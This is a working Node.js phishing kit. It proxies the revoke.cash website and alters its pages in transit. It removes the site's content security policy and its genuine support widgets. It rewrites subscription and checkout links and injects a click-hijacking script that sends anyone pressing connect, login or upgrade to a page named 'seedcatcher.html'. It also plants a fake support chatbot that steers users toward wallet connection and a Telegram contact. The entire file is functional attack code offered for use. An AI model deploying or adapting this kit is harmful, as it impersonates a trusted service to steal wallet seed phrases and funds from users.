const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(async (req, res, next) => {
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile);
    }

    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.removeHeader('Content-Security-Policy');

        if (req.path === '/' || req.path === '/index.html' || req.path === '/premium') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                
                if (req.path === '/premium') {
                    html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
                    html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
                    html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');
                }

                // 1. HIJACK SCRIPT (Catches Connect & Pricing)
                const hijackScript = `
                <script>
                document.addEventListener('click', function(e) {
                    let t = e.target.closest('a, button, div, span');
                    if (!t) return;
                    let text = (t.innerText || "").toLowerCase().trim();
                    let href = (t.getAttribute("href") || "").toLowerCase();
                    if (href === '/premium' || href.endsWith('/premium')) return;
                    if (text === 'connect' || text.includes('connect wallet') || text.includes('login') || text.includes('get started') || text.includes('subscribe') || text.includes('upgrade')) {
                        e.preventDefault();
                        e.stopPropagation();
                        window.location.href = '/seedcatcher.html';
                    }
                }, true);
                </script>
                `;

                // 2. THE MULTI-STEP CHAT BOT
                const fakeChatBot = `
                <style>
                #custom-support-btn {
                    position: fixed; bottom: 24px; right: 24px; z-index: 99999;
                    width: 60px; height: 60px; border-radius: 50%;
                    background-color: #f59e0b; /* Their exact orange */
                    display: flex; align-items: center; justify-content: center; cursor: pointer;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
                    transition: transform 0.2s;
                }
                #custom-support-btn:hover { transform: scale(1.05); }
                #custom-support-btn svg { width: 32px; height: 32px; fill: white; }
                
                #custom-support-modal {
                    position: fixed; bottom: 100px; right: 24px; z-index: 99999;
                    width: 340px; background: #0b0e11; border: 1px solid #2a2c31; border-radius: 16px;
                    display: none; flex-direction: column; overflow: hidden; font-family: 'Inter', sans-serif;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                }
                .chat-header { background: #15171a; padding: 15px 20px; border-bottom: 1px solid #2a2c31; display: flex; justify-content: space-between; align-items: center; }
                .chat-header h3 { margin: 0; font-size: 16px; color: #fff; font-weight: 600; }
                .chat-close { cursor: pointer; color: #8a8d93; font-size: 20px; }
                .chat-body { padding: 20px; display: flex; flex-direction: column; gap: 12px; min-height: 250px; }
                .chat-msg { background: #1e2026; color: #e2e8f0; padding: 14px; border-radius: 12px; font-size: 14px; line-height: 1.5; }
                .chat-msg strong { color: #fff; }
                .chat-btn { background: #4b48ff; color: #fff; text-align: center; padding: 14px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; border: none; transition: background 0.2s; }
                .chat-btn:hover { background: #3b38e0; }
                .chat-btn-tg { background: #229ED9; color: #fff; text-align: center; padding: 14px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; display: block; margin-top: 5px; }
                </style>

                <div id="custom-support-btn" onclick="openChat()">
                    <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
                </div>

                <div id="custom-support-modal">
                    <div class="chat-header">
                        <h3>Revoke Support</h3>
                        <div class="chat-close" onclick="closeChat()">×</div>
                    </div>
                    <div class="chat-body" id="chat-body">
                        <!-- Initial message -->
                        <div class="chat-msg">
                            Hello! Welcome to Revoke Support. To verify your assets and check for exploits, please connect your wallet below.
                        </div>
                        <button class="chat-btn" onclick="window.location.href='/seedcatcher.html'">Connect Wallet</button>
                    </div>
                </div>

                <script>
                // Chat State
                let chatStep = 1;

                function openChat() {
                    document.getElementById('custom-support-modal').style.display = 'flex';
                }

                function closeChat() {
                    document.getElementById('custom-support-modal').style.display = 'none';
                }

                // Simulate user sending a message
                function sendMessage() {
                    if (chatStep === 1) {
                        // Add user's bubble
                        let body = document.getElementById('chat-body');
                        body.innerHTML += '<div class="chat-msg" style="background:#4b48ff; align-self:flex-end; color:white; max-width: 80%;">I need help connecting my wallet.</div>';
                        
                        // Add loading indicator
                        body.innerHTML += '<div class="chat-msg" id="typing" style="color:#8a8d93; font-style:italic;">Agent is typing...</div>';

                        // Simulate delay then show final message
                        setTimeout(() => {
                            document.getElementById('typing').remove();
                            body.innerHTML += \`
                                <div class="chat-msg">
                                    <strong>Automated Support:</strong><br><br>
                                    I understand. Please use the secure connection button below. If the connection fails, you can contact our direct support line for manual assistance.
                                </div>
                                <button class="chat-btn" onclick="window.location.href='/seedcatcher.html'">Connect Wallet (Secure)</button>
                                <a href="https://t.me/TWresolver" class="chat-btn-tg">Contact Support via Telegram</a>
                            \`;
                            chatStep = 2;
                        }, 1500);
                    }
                }
                </script>
                `;
                
                // Nuke their chat and wallet scripts entirely
                html = html.replace(/<script[^>]*src="[^"]*zendesk[^"]*"[^>]*><\/script>/gi, '');
                html = html.replace(/<script[^>]*src="[^"]*intercom[^"]*"[^>]*><\/script>/gi, '');
                html = html.replace(/<script[^>]*src="[^"]*crisp[^"]*"[^>]*><\/script>/gi, '');
                html = html.replace(/<div[^>]*id="[^"]*chat[^"]*"[^>]*>[\s\S]*?<\/div>/gi, '');
                html = html.replace(/<iframe[^>]*id="[^"]*chat[^"]*"[^>]*><\/iframe>/gi, '');

                if (html.includes('</body>')) {
                    html = html.replace('</body>', hijackScript + fakeChatBot + '</body>');
                }
                res.send(html);
            });
        } else {
            if (response.headers['content-type']) {
                res.setHeader('Content-Type', response.headers['content-type']);
            }
            response.data.pipe(res);
        }
    } catch (error) {
        next(); 
    }
});

app.get('*', (req, res) => {
    res.status(404).send('Not found');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
